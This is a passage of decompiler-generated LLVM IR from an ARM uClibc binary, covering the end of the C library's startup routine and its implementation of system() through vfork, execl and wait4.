  %v3_17fac = add i32 %v2_17fac, %v1_17fac
  store i32 %v3_17fac, i32* %r3.global-to-local, align 4
  %v1_17fb0 = load i32, i32* @r6, align 4
  %v3_17fb0 = add i32 %v1_17fb0, 26448
  %v4_17fb0 = inttoptr i32 %v3_17fb0 to i32*
  store i32 %arg6, i32* %v4_17fb0, align 4
  %v0_17fb4 = load i32, i32* %ip.global-to-local, align 4
  %v1_17fb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_17fb4 = inttoptr i32 %v1_17fb4 to i32*
  store i32 %v0_17fb4, i32* %v2_17fb4, align 4
  store i32 120, i32* @r2, align 4
  %v1_17fc0 = load i32, i32* %r3.global-to-local, align 4
  %v2_17fc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_17fc0 = inttoptr i32 %v2_17fc0 to i32*
  store i32 %v1_17fc0, i32* %v3_17fc0, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_17fb0.c = load i32, i32* @r6, align 4
  %v3_17fb0.c = add i32 %v1_17fb0.c, 26448
  %v4_17fb0.c = inttoptr i32 %v3_17fb0.c to i32*
  store i32 %arg6, i32* %v4_17fb0.c, align 4
  %v0_17fb4.c = load i32, i32* %ip.global-to-local, align 4
  %v1_17fb4.c = load i32, i32* %r4.global-to-local, align 4
  %v2_17fb4.c = inttoptr i32 %v1_17fb4.c to i32*
  store i32 %v0_17fb4.c, i32* %v2_17fb4.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_17fcc = bitcast i32* %stack_var_-120 to i8*
  %v3_17fcc = call i32 @__GI_memset(i8* %v2_17fcc, i32 0)
  %v0_17fd0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17fd0 = inttoptr i32 %v0_17fd0 to i32*
  %storemerge.pre = load i32, i32* %v1_17fd0, align 4
  br label %dec_label_pc_17fdc

dec_label_pc_17fdc:                               ; preds = %dec_label_pc_17fdc, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_17fdc, %dec_label_pc_17fdc ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_17fdc = inttoptr i32 %storemerge to i32*
  %v2_17fdc = load i32, i32* %v1_17fdc, align 4
  store i32 %v2_17fdc, i32* %r3.global-to-local, align 4
  %v4_17fdc = add i32 %storemerge, 4
  store i32 %v4_17fdc, i32* %r2.global-to-local, align 4
  %v2_17fe0 = icmp eq i32 %v2_17fdc, 0
  store i32 %v4_17fdc, i32* %r1.global-to-local, align 4
  br i1 %v2_17fe0, label %dec_label_pc_17fec, label %dec_label_pc_17fdc

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fdc
  store i32 %v4_17fdc, i32* @r4, align 4
  store i32 %v2_17f88, i32* @r5, align 4
  %v1_1801029 = inttoptr i32 %v4_17fdc to i32*
  %v2_1801030 = load i32, i32* %v1_1801029, align 4
  store i32 %v2_1801030, i32* %r3.global-to-local, align 4
  %v2_1801432 = icmp eq i32 %v2_1801030, 0
  store i1 %v2_1801432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1801432, label %dec_label_pc_1801c, label %dec_label_pc_17ff8

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_17fec, %dec_label_pc_18010
  %v4_18000 = phi i32 [ %v1_1800c, %dec_label_pc_18010 ], [ %v4_17fdc, %dec_label_pc_17fec ]
  %v5_17ffc = phi i32 [ %v2_18010, %dec_label_pc_18010 ], [ %v2_1801030, %dec_label_pc_17fec ]
  %v2_17ff8 = icmp ugt i32 %v5_17ffc, 13
  %v7_17ff8 = icmp eq i32 %v5_17ffc, 14
  store i1 %v7_17ff8, i1* %cpsr_z.global-to-local, align 1
  %v2_17ffc = xor i1 %v2_17ff8, true
  %v3_17ffc = or i1 %v7_17ff8, %v2_17ffc
  br i1 %v3_17ffc, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_17ff8
  %v6_17ffc = and i32 %v5_17ffc, 536870912
  %v7_17ffc = icmp ne i32 %v6_17ffc, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_17ff8, %bb59
  %v1_18008 = phi i1 [ %v2_17ff8, %dec_label_pc_17ff8 ], [ %v7_17ffc, %bb59 ]
  %v2_18000 = xor i1 %v1_18008, true
  %v3_18000 = or i1 %v7_17ff8, %v2_18000
  br i1 %v3_18000, label %bb61, label %dec_label_pc_18010

bb61:                                             ; preds = %bb60
  store i32 %v4_18000, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18010

dec_label_pc_18010:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_18000, i32 ptrtoint (i32* @global_var_14d20.1072 to i32))
  %v0_1800c = load i32, i32* @r4, align 4
  %v1_1800c = add i32 %v0_1800c, 8
  store i32 %v1_1800c, i32* @r4, align 4
  %v1_18010 = inttoptr i32 %v1_1800c to i32*
  %v2_18010 = load i32, i32* %v1_18010, align 4
  store i32 %v2_18010, i32* %r3.global-to-local, align 4
  %v2_18014 = icmp eq i32 %v2_18010, 0
  store i1 %v2_18014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18014, label %dec_label_pc_1801c, label %dec_label_pc_17ff8

dec_label_pc_1801c:                               ; preds = %dec_label_pc_18010, %dec_label_pc_17fec
  %v1_18020 = call i32 @_dl_aux_init(i32 %v2_17f88)
  store i32 %v1_18020, i32* @r0, align 4
  %v1_18024 = call i32 @__GI___uClibc_init(i32 %v1_18020)
  store i32 %v1_18024, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_18030 = load i32, i32* @r6, align 4
  %v2_18030 = add i32 %v0_18030, 96
  %v3_18030 = inttoptr i32 %v2_18030 to i32*
  %v4_18030 = load i32, i32* %v3_18030, align 4
  store i32 %v4_18030, i32* %r1.global-to-local, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_18038 = icmp eq i32 %tmp54, 0
  store i1 %v2_18038, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18038, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1801c
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1801c, %bb62
  %v0_18044 = phi i32 [ %tmp54, %dec_label_pc_1801c ], [ 4096, %bb62 ]
  %v3_18040 = icmp eq i32 %tmp53, -1
  %v8_18040 = icmp eq i32 %tmp53, -1
  store i1 %v8_18040, i1* %cpsr_z.global-to-local, align 1
  %v2_18044 = inttoptr i32 %v4_18030 to i32*
  store i32 %v0_18044, i32* %v2_18044, align 4
  br i1 %v3_18040, label %dec_label_pc_1804c, label %dec_label_pc_18074

dec_label_pc_1804c:                               ; preds = %bb63
  %v0_1804c = call i32 @getuid()
  store i32 %v0_1804c, i32* @r0, align 4
  store i32 %v0_1804c, i32* @r4, align 4
  %v0_18054 = call i32 @geteuid()
  store i32 %v0_18054, i32* @r0, align 4
  %v0_18058 = load i32, i32* @r4, align 4
  %v9_18058 = icmp eq i32 %v0_18058, %v0_18054
  store i1 %v9_18058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18058, label %dec_label_pc_18060, label %dec_label_pc_1809c

dec_label_pc_18060:                               ; preds = %dec_label_pc_1804c
  %v1_18060 = call i32 @getgid(i32 %v0_18054)
  store i32 %v1_18060, i32* @r0, align 4
  store i32 %v1_18060, i32* @r4, align 4
  %v0_18068 = call i32 @getegid()
  store i32 %v0_18068, i32* @r0, align 4
  %v0_1806c = load i32, i32* @r4, align 4
  %v9_1806c = icmp eq i32 %v0_1806c, %v0_18068
  store i1 %v9_1806c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1806c, label %dec_label_pc_18074, label %dec_label_pc_1809c

dec_label_pc_18074:                               ; preds = %dec_label_pc_18060, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_18040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18040, label %dec_label_pc_180c0, label %dec_label_pc_18080

dec_label_pc_18080:                               ; preds = %dec_label_pc_18074
  store i32 %tmp52, i32* @r3, align 4
  %v9_18084 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_18084, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18084, label %dec_label_pc_1808c, label %dec_label_pc_1809c

dec_label_pc_1808c:                               ; preds = %dec_label_pc_18080
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_18094 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_18094, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18094, label %dec_label_pc_180c0, label %dec_label_pc_1809c

dec_label_pc_1809c:                               ; preds = %dec_label_pc_18080, %dec_label_pc_18060, %dec_label_pc_1804c, %dec_label_pc_1808c
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_180a4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_180b0 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_180bc = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_180bc, i32* @r0, align 4
  br label %dec_label_pc_180c0

dec_label_pc_180c0:                               ; preds = %dec_label_pc_1808c, %dec_label_pc_18074, %dec_label_pc_1809c
  %v0_180c0 = load i32, i32* @r7, align 4
  %v1_180c0 = inttoptr i32 %v0_180c0 to i32*
  %v2_180c0 = load i32, i32* %v1_180c0, align 4
  store i32 %v2_180c0, i32* %r2.global-to-local, align 4
  store i32 1260, i32* %r3.global-to-local, align 4
  %v1_180c8 = load i32, i32* @r6, align 4
  %v3_180c8 = add i32 %v1_180c8, 1260
  %v4_180c8 = inttoptr i32 %v3_180c8 to i32*
  store i32 %v2_180c0, i32* %v4_180c8, align 4
  %v0_180cc = load i32, i32* @r7, align 4
  %v1_180cc = inttoptr i32 %v0_180cc to i32*
  %v2_180cc = load i32, i32* %v1_180cc, align 4
  store i32 %v2_180cc, i32* @r4, align 4
  %v2_180d0 = icmp eq i32 %v2_180cc, 0
  store i1 %v2_180d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_180d0, label %bb65, label %dec_label_pc_180d8

dec_label_pc_180d8:                               ; preds = %dec_label_pc_180c0
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_180dc = load i32, i32* @r6, align 4
  %v2_180dc = add i32 %v0_180dc, 116
  %v3_180dc = inttoptr i32 %v2_180dc to i32*
  %v4_180dc = load i32, i32* %v3_180dc, align 4
  store i32 %v4_180dc, i32* %r3.global-to-local, align 4
  %v2_180e0 = inttoptr i32 %v4_180dc to i32*
  store i32 %v2_180cc, i32* %v2_180e0, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_180e8 = load i32, i32* @r7, align 4
  %v1_180e8 = inttoptr i32 %v0_180e8 to i32*
  %v2_180e8 = load i32, i32* %v1_180e8, align 4
  %v4_180ec = call i32 @__GI_strrchr(i32 %v2_180e8, i32 47, i32 %v2_180c0, i32 %v4_180dc)
  store i32 %v4_180ec, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_180f4 = icmp eq i32 %v4_180ec, 0
  store i1 %v2_180f4, i1* %cpsr_z.global-to-local, align 1
  %v0_180f8 = load i32, i32* @r6, align 4
  %v2_180f8 = add i32 %v0_180f8, 64
  %v3_180f8 = inttoptr i32 %v2_180f8 to i32*
  %v4_180f8 = load i32, i32* %v3_180f8, align 4
  store i32 %v4_180f8, i32* %r2.global-to-local, align 4
  br i1 %v2_180f4, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_180d8
  %v2_1810048 = inttoptr i32 %v4_180f8 to i32*
  store i32 0, i32* %v2_1810048, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_180d8
  %v2_180fc = add i32 %v4_180ec, 1
  store i32 %v2_180fc, i32* %r3.global-to-local, align 4
  %v2_18100 = inttoptr i32 %v4_180f8 to i32*
  store i32 %v4_180ec, i32* %v2_18100, align 4
  %v1_18104 = load i32, i32* %r3.global-to-local, align 4
  %v2_18104 = load i32, i32* %r2.global-to-local, align 4
  %v3_18104 = inttoptr i32 %v2_18104 to i32*
  store i32 %v1_18104, i32* %v3_18104, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_180c0
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_1811c = load i32, i32* @r6, align 4
  %v2_1811c = add i32 %v0_1811c, -12
  store i32 %v2_1811c, i32* %r8.global-to-local, align 4
  store i32 26444, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1812c = add i32 %v0_1811c, 26444
  %v4_1812c = inttoptr i32 %v3_1812c to i32*
  store i32 %arg5, i32* %v4_1812c, align 4
  %v0_1814417 = load i32, i32* %r4.global-to-local, align 4
  %v1_1814418 = load i32, i32* %r5.global-to-local, align 4
  %v3_1814420 = icmp ult i32 %v0_1814417, %v1_1814418
  %v9_1814426 = icmp eq i32 %v0_1814417, %v1_1814418
  store i1 %v9_1814426, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1814420, label %dec_label_pc_18134, label %dec_label_pc_18174.lr.ph

dec_label_pc_18134:                               ; preds = %dec_label_pc_18134, %bb65
  %v1_18134 = phi i32 [ %v1_18140, %dec_label_pc_18134 ], [ %v0_1814417, %bb65 ]
  %v0_18134 = load i32, i32* %r8.global-to-local, align 4
  %v4_18134 = mul i32 %v1_18134, 4
  %v5_18134 = add i32 %v4_18134, %v0_18134
  %v6_18134 = inttoptr i32 %v5_18134 to i32*
  %v7_18134 = load i32, i32* %v6_18134, align 4
  store i32 %v7_18134, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18134)
  %v0_18140 = load i32, i32* %r4.global-to-local, align 4
  %v1_18140 = add i32 %v0_18140, 1
  store i32 %v1_18140, i32* %r4.global-to-local, align 4
  %v1_18144 = load i32, i32* %r5.global-to-local, align 4
  %v3_18144 = icmp ult i32 %v1_18140, %v1_18144
  %v9_18144 = icmp eq i32 %v1_18140, %v1_18144
  store i1 %v9_18144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18144, label %dec_label_pc_18134, label %dec_label_pc_18174.lr.ph

dec_label_pc_18174.lr.ph:                         ; preds = %dec_label_pc_18134, %bb65
  %v2_1814c = icmp eq i32 %v0_17fa8, 0
  store i1 %v2_1814c, i1* %cpsr_z.global-to-local, align 1
  %v2_18154 = xor i1 %v2_1814c, true
  call void @__pseudo_cond_branch(i1 %v2_18154, i32 %v0_17fa8)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_18168 = load i32, i32* @r6, align 4
  %v2_18168 = add i32 %v0_18168, -12
  store i32 %v2_18168, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18174

dec_label_pc_18174:                               ; preds = %dec_label_pc_18174.dec_label_pc_18174_crit_edge, %dec_label_pc_18174.lr.ph
  %v1_18174 = phi i32 [ %v1_18180, %dec_label_pc_18174.dec_label_pc_18174_crit_edge ], [ 0, %dec_label_pc_18174.lr.ph ]
  %v0_18174 = phi i32 [ %v0_18174.pre, %dec_label_pc_18174.dec_label_pc_18174_crit_edge ], [ %v2_18168, %dec_label_pc_18174.lr.ph ]
  %v4_18174 = mul i32 %v1_18174, 4
  %v5_18174 = add i32 %v4_18174, %v0_18174
  %v6_18174 = inttoptr i32 %v5_18174 to i32*
  %v7_18174 = load i32, i32* %v6_18174, align 4
  store i32 %v7_18174, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18174)
  %v0_18180 = load i32, i32* %r4.global-to-local, align 4
  %v1_18180 = add i32 %v0_18180, 1
  store i32 %v1_18180, i32* %r4.global-to-local, align 4
  %v1_18184 = load i32, i32* %r5.global-to-local, align 4
  %v3_18184 = icmp ult i32 %v1_18180, %v1_18184
  %v9_18184 = icmp eq i32 %v1_18180, %v1_18184
  store i1 %v9_18184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18184, label %dec_label_pc_18174.dec_label_pc_18174_crit_edge, label %dec_label_pc_1818c

dec_label_pc_18174.dec_label_pc_18174_crit_edge:  ; preds = %dec_label_pc_18174
  %v0_18174.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_18174

dec_label_pc_1818c:                               ; preds = %dec_label_pc_18174
  %v0_18190.pre = load i32, i32* @r6, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  %v2_18190 = add i32 %v0_18190.pre, 108
  %v3_18190 = inttoptr i32 %v2_18190 to i32*
  %v4_18190 = load i32, i32* %v3_18190, align 4
  store i32 %v4_18190, i32* %r2.global-to-local, align 4
  store i32 %v4_18190, i32* %r3.global-to-local, align 4
  %v2_18198 = icmp eq i32 %v4_18190, 0
  store i1 %v2_18198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18198, label %dec_label_pc_181b0, label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_1818c
  call void @__pseudo_branch(i32 %v4_18190)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_181ac = load i32, i32* @r0, align 4
  %v2_181ac = inttoptr i32 %v1_181ac to i32*
  store i32 0, i32* %v2_181ac, align 4
  %v0_181b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_181b0

dec_label_pc_181b0:                               ; preds = %dec_label_pc_1818c, %dec_label_pc_181a0
  %v0_181b4 = phi i32 [ %v0_18190.pre, %dec_label_pc_1818c ], [ %v0_181b4.pre, %dec_label_pc_181a0 ]
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_181b4 = add i32 %v0_181b4, 84
  %v3_181b4 = inttoptr i32 %v2_181b4 to i32*
  %v4_181b4 = load i32, i32* %v3_181b4, align 4
  store i32 %v4_181b4, i32* %r2.global-to-local, align 4
  store i32 %v4_181b4, i32* %r3.global-to-local, align 4
  %v2_181bc = icmp eq i32 %v4_181b4, 0
  store i1 %v2_181bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181bc, label %dec_label_pc_181d4, label %dec_label_pc_181c4

dec_label_pc_181c4:                               ; preds = %dec_label_pc_181b0
  call void @__pseudo_branch(i32 %v4_181b4)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_181d0 = load i32, i32* @r0, align 4
  %v2_181d0 = inttoptr i32 %v1_181d0 to i32*
  store i32 0, i32* %v2_181d0, align 4
  %v0_181d8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_181d4

dec_label_pc_181d4:                               ; preds = %dec_label_pc_181b0, %dec_label_pc_181c4
  %v0_181d8 = phi i32 [ %v0_181b4, %dec_label_pc_181b0 ], [ %v0_181d8.pre, %dec_label_pc_181c4 ]
  store i32 28, i32* %r3.global-to-local, align 4
  %v2_181d8 = add i32 %v0_181d8, 28
  %v3_181d8 = inttoptr i32 %v2_181d8 to i32*
  %v4_181d8 = load i32, i32* %v3_181d8, align 4
  store i32 %v4_181d8, i32* %r3.global-to-local, align 4
  %v0_181dc = load i32, i32* @r7, align 4
  store i32 %v0_181dc, i32* %r1.global-to-local, align 4
  %v1_181e0 = inttoptr i32 %v4_181d8 to i32*
  %v2_181e0 = load i32, i32* %v1_181e0, align 4
  store i32 %v2_181e0, i32* %r2.global-to-local, align 4
  %v0_181e4 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_181f0 = call i32 @__GI_exit(i32 %v0_181e4)
  %v0_181f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_181f4, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_181d4
  %v1_181f4 = load i32, i32* %r1.global-to-local, align 4
  %v5_181f4 = mul i32 %v1_181f0, 1024
  %v6_181f4 = and i32 %v1_181f4, %v5_181f4
  store i32 %v6_181f4, i32* %r1.global-to-local, align 4
  %v2_181f8 = load i32, i32* %r4.global-to-local, align 4
  %v8_181f8 = shl i32 %v2_181f8, %v1_181f0
  %v9_181f8 = and i32 %v8_181f8, %v1_181f0
  %v2_181fc = load i32, i32* %ip.global-to-local, align 4
  %v8_181fc = shl i32 %v2_181fc, %v9_181f8
  %v9_181fc = and i32 %v8_181fc, %v9_181f8
  %v2_18208 = load i32, i32* @r2, align 4
  %v3_18208 = and i32 %v2_18208, %v9_181fc
  store i32 %v3_18208, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_181d4, %bb66
  %v4_18214 = phi i32 [ %v1_181f0, %dec_label_pc_181d4 ], [ 0, %bb66 ]
  ret i32 %v4_18214

; uselistorder directives
  uselistorder i32 %v1_181f0, { 2, 1, 3, 0 }
  uselistorder i32 %v0_18190.pre, { 1, 0 }
  uselistorder i32 %v1_18184, { 1, 0 }
  uselistorder i32 %v1_18180, { 3, 2, 1, 0 }
  uselistorder i32 %v1_18144, { 1, 0 }
  uselistorder i32 %v1_18140, { 1, 2, 3, 0 }
  uselistorder i32 %v4_180f8, { 1, 0, 2 }
  uselistorder i1 %v8_18040, { 1, 2, 0 }
  uselistorder i32 %v2_18010, { 1, 2, 0 }
  uselistorder i32 %v1_1800c, { 1, 2, 0 }
  uselistorder i1 %v2_17ff8, { 1, 0 }
  uselistorder i32 %v4_17fdc, { 0, 2, 1, 4, 5, 3 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_17fa8, { 1, 0 }
  uselistorder i32 %v3_17f78, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 5, 7, 6, 0, 1, 3, 2, 4, 9, 8, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 1, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 47, { 0, 3, 2, 1 }
  uselistorder i32 32770, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 0, 3, 1, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_181d4, { 1, 0 }
  uselistorder label %dec_label_pc_181b0, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_180c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1809c, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_18010, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_17ff8, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18234 = load i32, i32* @r4, align 4
  %v0_18240 = load i32, i32* %r0.global-to-local, align 4
  %v2_18240 = icmp eq i32 %v0_18240, 0
  br i1 %v2_18240, label %bb, label %dec_label_pc_18258

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18374

dec_label_pc_18258:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18260 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18270 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18280 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_18280, i32* @r0, align 4
  %v0_18288 = call i32 @__vfork()
  store i32 %v0_18288, i32* %r0.global-to-local, align 4
  store i32 %v0_18288, i32* @r4, align 4
  %v1_1828c = icmp slt i32 %v0_18288, 0
  br i1 %v1_1828c, label %dec_label_pc_18294, label %dec_label_pc_182c0

dec_label_pc_18294:                               ; preds = %dec_label_pc_18258
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1829c = call i32 @bsd_signal(i32 3, i32 %v2_18260)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_182a8 = call i32 @bsd_signal(i32 2, i32 %v2_18270)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_182b4 = call i32 @bsd_signal(i32 17, i32 %v2_18280)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18374

dec_label_pc_182c0:                               ; preds = %dec_label_pc_18258
  %v2_1828c = icmp eq i32 %v0_18288, 0
  br i1 %v2_1828c, label %dec_label_pc_182c4, label %dec_label_pc_18318

dec_label_pc_182c4:                               ; preds = %dec_label_pc_182c0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_182cc = call i32 @bsd_signal(i32 3, i32 0)
  %v0_182d0 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_182d8 = call i32 @bsd_signal(i32 2, i32 %v0_182d0)
  %v0_182dc = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_182e4 = call i32 @bsd_signal(i32 17, i32 %v0_182dc)
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33860), i32* %r0.global-to-local, align 4
  %v0_18308 = load i32, i32* @r4, align 4
  %v5_1830c = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33860), i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33852), i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33848), i32 %v0_18240, i32 %v0_18308)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_18314 = call i32 @__GI__exit(i32 127)
  store i32 %v1_18314, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18318

dec_label_pc_18318:                               ; preds = %dec_label_pc_182c0, %dec_label_pc_182c4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18320 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1832c = call i32 @bsd_signal(i32 2, i32 1)
  %v2_18338 = ptrtoint i32* %stack_var_-12 to i32
  %v0_1833c = load i32, i32* @r4, align 4
  store i32 %v0_1833c, i32* %r0.global-to-local, align 4
  %v2_18340 = call i32 @wait4(i32 %v0_1833c, i32 %v2_18338)
  store i32 %v2_18340, i32* %r0.global-to-local, align 4
  %v7_18344 = icmp eq i32 %v2_18340, -1
  br i1 %v7_18344, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_18318
  store i32 %v2_18340, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_18318, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18354 = call i32 @bsd_signal(i32 3, i32 %v2_18260)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18360 = call i32 @bsd_signal(i32 2, i32 %v2_18270)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_1836c = call i32 @bsd_signal(i32 17, i32 %v2_18280)
  %v3_18370 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18370, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18374

dec_label_pc_18374:                               ; preds = %bb, %dec_label_pc_18294, %bb12
  %v1_1837c = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_18294 ], [ %v3_18370, %bb12 ]
  store i32 %v3_18234, i32* @r4, align 4
  ret i32 %v1_1837c

; uselistorder directives
  uselistorder i32 %v2_18340, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 7, 0, 14, 13, 12, 11, 10, 9, 5, 4, 3, 2, 8, 6, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33860), { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
